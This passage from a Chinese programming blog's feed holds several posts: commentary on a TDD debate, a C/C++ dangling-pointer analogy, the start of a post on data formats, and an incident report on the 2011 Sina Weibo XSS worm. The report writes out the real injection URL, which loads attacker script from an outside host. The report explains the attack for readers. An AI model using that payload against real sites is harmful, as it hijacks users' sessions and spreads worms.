<p>Coplien接着说， 因为Bob大叔可以在软件前期做很多很重要的决定，这让得后面的事变得相对比较简单。Coplien根本不相信只要你把代码往那一放，在上面披上一层皮，再设置好一些角色，设置好接口，在文档里写上整个业务结构，而你只有在有人花钱的时候你才会在其中填充进真正的代码，反之就违反了你的YAGNI原则。所以，你只是在你需要的时候做你要做的事，但你却还是要提前得到你的软件架构，否则你一定会把你自己逼进死角的。</p>
<p>Bob大叔辩解到，我说的可能和你说的这个有点不同。我们应该不会像你所说的往接口中写一些抽象成员函数，而是创建一些有抽象接口的对象。当然，我不会把一下子为这个对象装载上一堆方法。那些是我需要使用测试驱动或是需求驱动来做的事，我还会随时随地在看是否哪里软件架构可以让我拆分接口。</p>
<p>Coplien说，问题 是你得知道你要干什么？他说他非常同意Knet的书”XP Explained”里说的——“你不能去猜”，然后他举了一个例子，一个他曾经在一个电信项目中重新架构软件的例子，这是一个长途交换机的项目，项目组特别喜欢用面向对象，有一个人需要去做一个“Recovery Object”（应该是系统恢复对象），Coplien说这是很扯的一件事，因为系统恢复根本就不是一个对象，因为他对业务不熟，所以想这么做。而当你在细节上分析的时候，你会发现这根本就不是一个有成员方法的对象。我个人认为，Coplien想用这个例子来说Bob大叔的先定义对象的抽象接口并不是一个好的需求分析的方法。Coplien还说，这个事情今天被资本化成了SOA，真是在玩火啊。</p>
<p>Bob大叔说，这个他很同意。你的确需要知道这个对象的意义是什么。而且他和Coplien都同意应该根据可运行的代码来决定未来，而不是基于投机心理搞一个巨大无比的架构。</p>
<p>此时，Bob大叔把话题又带回原地，他问Coplien：“你需要多少的时间才能写出可运行的代码？是不是一个系统需要写200万行代码才能算？”，Coplien说，在他的经历中，200万行代码算是小项目了，他的项目都是几亿行代码的。而在让代码可以跑起来，他至少需要让所有的对象都联系起来。</p>
<p>Bob追问到，“那么你是怎么测试这些对象的连接性的？”，Coplien说，我当然要测试，我会测试系统启动和停止，看看有没有内存问题，半小时就好了。Bob大叔似乎找到了突破点，于是说到：“Excellent！那么我们间的分歧是什么呢？也许你只是不同意TDD的概念和其专业化，当然，这是另外一个话题了”。</p>
<p>然后，Coplien说了一段我非常非常认同的话——“我看到很多人正在做正确的事，来避免我们之前讨论的那些问题，当然那不是TDD的扩展，而是Dan North所说的BDD。可见，软件开发中很多人在开发软件中都是在用正确的很好的方法，而我对此有意见的是，有人把这个事说成TDD，然后人们就去买相关的书来了解TDD，并且看到“architecture only comes from tests”，我在过去6个月中听到过4次这样的说法，这就像你所说的，完全就是horse shit。而关于你所说的专业化的事，如果你没有见过一个专业化你怎么知道？”。（不是吗？大多数人都知道怎么开发软件，而不是TDD才是专业化的软件开发。）</p>
<p>然后，Bob想多谈谈专业化的事，Bob说，在今天，一个不负责任的程序会提交一段他没有跑过单元测试的代码，所以，要确定你没有把一条没有测试过的代码提交到代码库里的最佳做法就是TDD。</p>
<p>Coplien完全不同意这个说法。他觉得底层的东西是更重要的。他用了一个示例来攻击Bob大叔的这个观点，他先是说代码走查和结对编程都有好的有价值的地方，当然和这个话题不相关。然后他又说了Unit Test，想想我们的单元测试，可能我们的测试案例并不可能测试我们程序中参数的各种状态，这些状态有可能只是半打，有可能是一百个，有可能是2的32次方个，所以，我们可以命中一些状态，也会没有测试到一些状态，我们的测试真的只是试验性的，所以，如果你在测试中发现bug，你真的很幸运。</p>
<p>随后，Coplien推崇了一个叫“<a href="https://en.wikipedia.org/wiki/Design_by_contract" target="_blank">Design By Contrac</a>t” – 契约式设计的方法（我在<a title="一些软件设计的原则" href="https://coolshell.cn/articles/4535.html" target="_blank">软件设计中那些方法</a>中提到过，），这个方法认为软件有前验条件，后验条件，还有不变的。这个方法是Eiffel项目使用的一个方法，使用这个方法你可以静态的去做一些检查，相当于你做了一个基础架构来干这些事。Coplien相信这个方法有TDD所有的优点——我需要努力思考我的代码，我需要思考软件的外部接口，而且，Coplien发现这么做会比做测试更有效。这会让你对那些参数的范围考虑地更为宽广，而不是只在测试案例写几个随机分散的值来测试。</p>
<p>今天，Bertrand Meyer(Eiffel语言的创造者，他也不赞同TDD)把这个方法推进了一步，叫CDD – Contract Driven Development，这个是一种关注于对象间关系，其在程序运行前提条件和运行后的后验条中达成一种契约，可以通过对契约条件的动态或静态的检查，来对程序的功能进行验证。这样可以让你更有效地测试程序。这种方法需要对业务的重点部位非常好的了解。这是TDD很难做到的（这就是我在《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》一文中说的TDD的测试范围是个很大的问题）。</p>
<p>Bob大叔似乎在努力回忆CDD和Eiffel，然后他说，TDD不就是干这个的吗？TDD就是把契约变成单元测试，不但测试输入，也测试返回值，这不就是先验条件和后验条件，而且他说，Unit Test和代码结合得更紧，而契约没有和代码结合得紧密，这是他觉得很不舒服的地方。</p>
<p>Coplien说Bob大叔创建了不应该创建的二元论。他说代码在哪里，UT就跟到哪里，代码有多臃肿，UT就有多臃肿，而UT也是代码，也会有BUG，所以，其实这真是事半功倍。还有一个最有名的示例是ADA编译器，其使用了TDD，反而增加了代码中的BUG，因为你的代码多，测试就多，代码就更多，整个代码就太过臃肿。如果你测试中使用了断言，这意味着你就耦合上了代码，你的测试案例和你的代码耦合地越多，你的代码就越难维护。这就是我在《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》一文中说的TDD的代码臃肿和维护问题）</p>
<p>Bob大叔为Coplien对代码臃肿的说法感到惊讶。Coplien说，这就是他的经历，他看到的。Bob大叔承认有很多混乱的测试和混乱的代码，他觉得像XUnit这样的工具被滥用了。Coplien打断道，这不是要和你争论的，我争论的是这就是我看到大家在实践的东西。</p>
<p>Bob大叔反回到，你有没有看到CDD也被滥用的情况？Coplien说，他只觉得目前，软件业对CDD用的还不够。</p>
<p>最后，时间不够了，Bob大叔问了一个不相干的问题，他说，我们这里有BDD,CDD, TDD, 关于DD，他不知道谁是最先第一个使用带DD这个词的，他说他好像记得一个RDD – Responsibility Driven Development。</p>
<p>Coplien对这个问题可能很无语，他只能说——“DD，这是Unix的一个命令嘛，Disk Dump，但这可能算。谢谢你Bob，很高兴又一次见到你 ”</p>
<p style="text-align: center;">——————————————————正文分割线————————————————————</p>
<p>看完后，我的感觉如下：</p>
<ul>
<li>这是2008年就在讨论的事，而在2011年我发布了《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》后中国这边才开始讨论。（InfoQ和 Thoughtworks怎么不去找Coplien？）</li>
<li>英语很重要，不懂英语，只看国内的东西，你就容易被洗脑，你就需要更多的时间和精力去思考那些早被人思考过的问题。</li>
<li>开发和测试，都是需要充分地了解业务，充分的思考，充分权衡后才能做得好的事。并不是你用了哪个方法后就专业了，就NB了。</li>
<li>相当BS——上不谈业务，下不谈技术，只谈方法论的人和公司，这是绝对的扭曲。</li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8209.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8209.html" class="wp_rp_title">“单元测试要做多细？”</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5531.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5531.html" class="wp_rp_title">Test-Driven Development？别逗了</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5143.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5143.html" class="wp_rp_title">在新浪微博上关于敏捷的一些讨论</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3778.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3778.html" class="wp_rp_title">敏捷水管工</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3745.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3745.html" class="wp_rp_title">再谈敏捷和ThoughtWorks中国咨询师</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3766.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3766.html" class="wp_rp_title">[转]TDD到底美还是不美？</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4891" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="556b017bd4">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>9</strong> 人打了分，平均分： <strong>3.22</strong> )<br><span class="post-ratings-text" id="ratings_4891_text"></span><meta itemprop="name" content="Bob大叔和Jim Coplien对TDD的论战">
<meta itemprop="headline" content="Bob大叔和Jim Coplien对TDD的论战">
<meta itemprop="description" content="今年春节时，我写了一篇《TDD并不是看上去的那么美》，在这篇文章中我列举了一些关于使用TDD的一些难点和对TDD的质疑，后来出现了一些争论（可参见那篇文章的评论），以及Todd同学的《TDD到底美不美》，还有infoQ中文上的那个几乎没有营养离线讨论。今天，有网友给我推来一个英文版infoQ的视频——“Coplien and Martin Debate TDD, CDD and Professio...">
<meta itemprop="datePublished" content="2011-06-27T08:41:23+08:00">
<meta itemprop="dateModified" content="2011-06-27T09:58:37+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4891.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4891.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.22">
<meta itemprop="ratingCount" content="9">
</div>
</div>
<div id="post-ratings-4891-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-27T08:41:23+08:00</pubDate>
<guid>https://coolshell.cn/articles/4891.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 在函数外存取局部变量的一个比喻 ]]></title>
<link>https://coolshell.cn/articles/4907.html</link>
<content><![CDATA[ 
<p>在StackOverflow上一这样一个<a href="https://stackoverflow.com/questions/6441218/can-a-local-variables-memory-be-accessed-outside-its-scope/6445794#6445794" target="_blank">关于C/C++的问题</a>，问问题的人给了一个代码如下：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int * foo()
{
    int a = 5;
    return &amp;a;
}

int main()
{
    int* p = foo();
    cout &lt;&lt; *p;
    *p = 8;
    cout &lt;&lt; *p;
}</pre>
<p>你可以编译并运行这个代码（编译时会有一个Warning），结果是：5 8。看上去你可以存取一个函数内的局部变量。但这和我们理解的不一样——函数内的变量在函数退出时就被释放了，不应该在外部还可以被引用。当然，对于C/C++熟悉的人都知道其实并不是真正的释放，你依然还可以通过内存地址去进行操作，这是C/C++的内存管理的不安全性——指针可以用来乱指。</p>
<p>这个问题的解答是比较简单的，但是这个问题有一个答案中的<a href="https://stackoverflow.com/questions/6441218/local-variables-memory-can-be-accessed-outside-its-scope/6445794#6445794" target="_blank">比喻非常精彩</a>。这个比喻是这样的——</p>
<p><span id="more-4907"></span>你在某个酒店订了一个房，你入住的时候，你放了一本书在这个酒店的抽屉里，但是你走的时候，你忘了这本书。而且，你还没有把这个房间的钥匙还回去。于是，你在未来某个时候，偷偷地回来，打开这个房间的门，你看到了你的书还在里间。当然，还还可以放回别的书。因为，这个酒店管理不会在你走的时候把你留下的书清走，而且，这个酒店的管理的安保措施不是那么严格，因为他信任每一个客人都会遵守管理条例。</p>
<p>在这种情况下，如果你幸运的话，书还会在那里，也可能你的书已经没了。也有可能当你回去的时候，有一个人在那里正在撕你的书，或者酒店把那个抽屉都挪走并变成衣柜，或是整个酒店正在被拆除以改成了一个足球场，而你偷偷摸摸进到施工现场的时候被炸死。</p>
<p>真是很精彩的比喻。这就是C/C++的不安全的地方，也正是Linus说的，<a href="https://coolshell.cn/articles/1724.html" target="_blank">C++是一门恐怖的语言是因为有很多不合格的程序员在使用它</a>。就像你看到小孩子玩火一样的恐怖。</p>
<p>关于这个事，还有一个比较经典的示例如下—— 函数a的初始化会影响函数b的数组。注意函数a中的 <span style="font-family: Consolas, Monaco, 'Courier New', Courier, monospace; font-size: 12px; line-height: 18px; white-space: pre;"><code>volatile </code><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif; font-size: 13px; line-height: 19px; white-space: normal;">关键字。</span></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;iostream&gt;
using namespace std; 
void a()
{
    volatile int array[10];
    for (int i = 0; i &lt; 10; i++)
        array[i] = i;
}

void b()
{
    int array[10];
    for (int i = 0; i &lt; 10; i++)
        cout &lt;&lt; array[i];
}

int main()
{
    a();
    b();
}</pre>
<p>真是可爱的C/C++。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11466.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11466.html" class="wp_rp_title">C语言的整型溢出问题</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4907" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="9b4972a687">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>15</strong> 人打了分，平均分： <strong>4.40</strong> )<br><span class="post-ratings-text" id="ratings_4907_text"></span><meta itemprop="name" content="在函数外存取局部变量的一个比喻">
<meta itemprop="headline" content="在函数外存取局部变量的一个比喻">
<meta itemprop="description" content="在StackOverflow上一这样一个关于C/C++的问题，问问题的人给了一个代码如下：

[c]int * foo()
{
    int a = 5;
    return &amp;a;
}

int main()
{
    int* p = foo();
    cout &lt;&lt; *p;
    *p = 8;
    cout &lt;&lt; *p;
}[/c]

你可以...">
<meta itemprop="datePublished" content="2011-06-28T11:35:52+08:00">
<meta itemprop="dateModified" content="2011-06-28T11:35:52+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4907.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4907.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.4">
<meta itemprop="ratingCount" content="15">
</div>
</div>
<div id="post-ratings-4907-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-28T11:35:52+08:00</pubDate>
<guid>https://coolshell.cn/articles/4907.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 新浪微博的XSS攻击 ]]></title>
<link>https://coolshell.cn/articles/4914.html</link>
<content><![CDATA[ 
<p>今天晚上（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，“让女人心动的100句诗歌”，“3D肉团团高清普通话版种子”，“这是传说中的神仙眷侣啊”，“惊爆!范冰冰艳照真流出了”等等微博和私信，并自动关注一位名为hellosamy的用户。</p>
<p>事件的经过线索如下：</p>
<ul>
<li>20:14，开始有大量带V的认证用户中招转发蠕虫</li>
<li>20:30，2kt.cn中的病毒页面无法访问</li>
<li>20:32，新浪微博中hellosamy用户无法访问</li>
<li>21:02，新浪漏洞修补完毕</li>
</ul>
<p style="text-align: center;"> </p>
<figure id="attachment_4915" aria-describedby="caption-attachment-4915" style="width: 583px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-4915" class="wp-caption-text">新浪微博XSS事件</figcaption></figure>
<p style="text-align: left;"> </p>
<p style="text-align: left;">在这里，想和大家介绍一下XSS攻击，XSS攻击又叫跨站脚本式攻击，你Google一下可以搜到很多很多的文章。我在这里就简单地说一下。</p>
<p style="text-align: left;"><span id="more-4914"></span></p>
<p style="text-align: left;">首先，我们都知道网上很多网站都可以“记住你的用户名和密码”或是“自动登录”，其实是在你的本地设置了一个cookie，这种方式可以让你免去每次都输入用户名和口令的痛苦，但是也带来很大的问题。试想，如果某用户在“自动登录”的状态下，如果你运行了一个程序，这个程序访问“自动登录”这个网站上一些链接、提交一些表单，那么，也就意味着这些程序不需要输入用户名和口令的手动交互就可以和服务器上的程序通话。这就是XSS攻击的最基本思路。</p>
<p style="text-align: left;">再说一点，不一定是“记住你的用户名和密码”或是“自动登录”的方法，因为HTTP是无状态的协议，所以，几乎所有的网站都会在你的浏览器上设置cookie来记录状态，以便在其多个网页切换中检查你的登录状态。而现在的浏览器的运行方式是多页面或多窗口运行，也就是说，你在同一个父进程下开的多个页面或窗口里都可以无偿和共享使用你登录状态的。</p>
<p style="text-align: left;">当然，你不必过于担心访问别的网站，在别的网站里的js代码会自动访问你的微博或是网银。因为浏览器的安全性让js只能访问自己所在网站的资源（你可以引入其它网站的js）。当然，这是浏览器对js做的检查，所以，浏览器并不一定会做这个检查，这就是为什么<a title="中国仍是IE6的重灾区" href="https://coolshell.cn/articles/3921.html" target="_blank">IE6是史上最不安全的浏览器</a>，没有之一。只要你没有在用IE6，应该没有这些问题。</p>
<p style="text-align: left;">XSS攻击有两种方法，</p>
<ul>
<li>一种就像SQL Injection或CMD Injection攻击一样，我把一段脚本注入到服务器上，用户访问方法服务器的某个URL，这个URL就会把远端的js注入进来，这个js有可能自动进行很多操作。比如这次事件中的帮你发微博，帮你发站内消息等。注入有很多方法，比如：提交表单，更改URL参数，上传图片，设置签名，等等。</li>
</ul>
<ul>
<li>另一类则是来来自外部的攻击，主要指的自己构造XSS 跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个跨站网页放在自己的服务器上，然后通过结合其它技术，如 社会工程学等，欺骗目标服务器的管理员打开。这一类攻击的威胁相对较低，至少ajax 要发起跨站调用是非常困难的（你可能需要hack浏览器）。</li>
</ul>
<p>这次新浪微博事件是第一种，其利用了微博广场页面 http://weibo.com/pub/star 的一个URL注入了js脚本，其通过http://163.fm/PxZHoxn短链接服务，将链接指向：</p>
<p style="text-align: left; padding-left: 30px;">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</p>
<p style="text-align: left;">注意，上面URL链接中的其实就是&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;。</p>
<p style="text-align: left;">攻击者并不一定是2kt.cn的人，因为.cn被国家严格管制（大家不知道coolshell.cn 的备案备了不知有多少次），所以，我个人觉得这个人不会愚蠢到用自己域名来做攻击服务器。</p>
<h4 style="text-align: left;">其它</h4>
<ul>
<li>初步发现 Chrome 和 Safari 都没中招。IE、Firefox未能幸免。</li>
<li>史上最著名的XSS攻击是Yahoo Mail 的<a href="https://en.wikipedia.org/wiki/Yamanner" target="_blank">Yamanner </a>蠕虫是一个著名的XSS 攻击实例。早期Yahoo Mail 系统可以执行到信件内的javascript 代码。并且Yahoo Mail 系统使用了Ajax技术，这样病毒javascript 可以的向Yahoo Mail 系统发起ajax 请求，从而得到用户的地址簿，并发送攻击代码给他人。</li>
<li>为什么那个用户叫hellosamy，因为<a href="https://en.wikipedia.org/wiki/Samy_(XSS)" target="_blank">samy</a>是第一个XSS攻击性的蠕虫病毒，在MySpace上传播。</li>
<li>关于攻击的代码在这里：<a href="https://coolshell.cn/wp-content/uploads/2011/06/06.28_sina_XSS.txt.zip">06.28_sina_XSS.txt</a> （编码风格还是很不错的）</li>
</ul>
<p style="text-align: left;">（全文完）</p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/5247.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_title">国内微博和Twitter的最大不同</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3872.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_title">微软用新浪来当反面教材</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8711.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_title">程序员疫苗：代码注入</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4914" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="bb69c461bc">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>24</strong> 人打了分，平均分： <strong>4.50</strong> )<br><span class="post-ratings-text" id="ratings_4914_text"></span><meta itemprop="name" content="新浪微博的XSS攻击">
<meta itemprop="headline" content="新浪微博的XSS攻击">
<meta itemprop="description" content="今天晚上（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，“让女人心动的100句诗歌”，“3D肉团团高清普通话版种子”，“这是传说中的神仙眷侣啊”，“惊爆!范冰冰艳照真流出了”等等微博和私信，并自动关注一位名为hellosamy的用户。

事件的经过线索如下：

	20:14，开始有大量带...">
<meta itemprop="datePublished" content="2011-06-28T23:10:18+08:00">
<meta itemprop="dateModified" content="2011-06-29T07:48:20+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4914.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4914.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.5">
<meta itemprop="ratingCount" content="24">
</div>
</div>
<div id="post-ratings-4914-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-28T23:10:18+08:00</pubDate>
<guid>https://coolshell.cn/articles/4914.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 语言的数据亲和力 ]]></title>
<link>https://coolshell.cn/articles/4905.html</link>
<content><![CDATA[ 
<p><strong>[ 感谢 <a href="https://www.cnblogs.com/weidagang2046/" target="_blank">Todd 同学</a>投递本文 ]</strong></p>
<p><span style="font-family: 'Lucida Console';">目前，程序设计语言似乎进入了一个蓬勃发展的时期，Javascript、Perl、Python、Ruby、Groovy等一批较新的语言正越来越多地被熟悉和使用，而C++、C#、Java等主流语言也在不断地融入函数式和动态性特征。程序员的百宝箱中可供选择的宝贝是越来多了，而社区中关于语言间的比较和争论也更为热烈，我们常常见到关于“面向过程和面向对象的比较”、“动态语言和静态语言的比较”、“命令式和函数式范式的比较”等比较。我注意到这类讨论的关注点多集中于设计相关话题，如“动态语言的Duck typing多态和静态语言的继承多态的比较”，“Prototype based和Class based的比较”等。但我认为还有一个十分重要的方面值得关注，这就是数据处理。</span></p>
<p><span style="font-family: 'Lucida Console';">数据处理之所以重要是因为不论是本地信息存储还是系统间信息交换都需要建立在一定的数据格式基础上。另外，不管语言属于那种范式，设计上采用什么模式，在微观层次上程序很大一部分工作都是在做数据处理。所以，从数据处理角度比较和理解语言间的差异有重要的现实意义。虽然数据通常是平台和语言无关的，但不同的语言在处理某种格式的数据时会表现出不同的难度，甚至某些数据格式只能采用特定的语言才能实现，这就是数据亲和力的不同。</span></p>
<p><span style="font-family: 'Lucida Console';">语言的数据亲和力(Data Affinity)指的是语言的数据模型与某种数据格式之间的匹配程度。语言对某种数据格式亲和力越强，则操作某类数据越容易。</span></p>
<p> </p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%97%E8%8A%82%E5%9D%97%E6%A0%BC%E5%BC%8F" title="二进制字节块格式">二进制字节块格式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F" title="文本格式 ">文本格式 </a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%BB%93%E6%9E%84%E5%8C%96%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F" title="结构化文本格式">结构化文本格式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%97%E8%8A%82%E5%9D%97%E6%A0%BC%E5%BC%8F"></span><strong><span style="font-family: 'Lucida Console';">二进制字节块格式</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p> </p>
<p> </p>
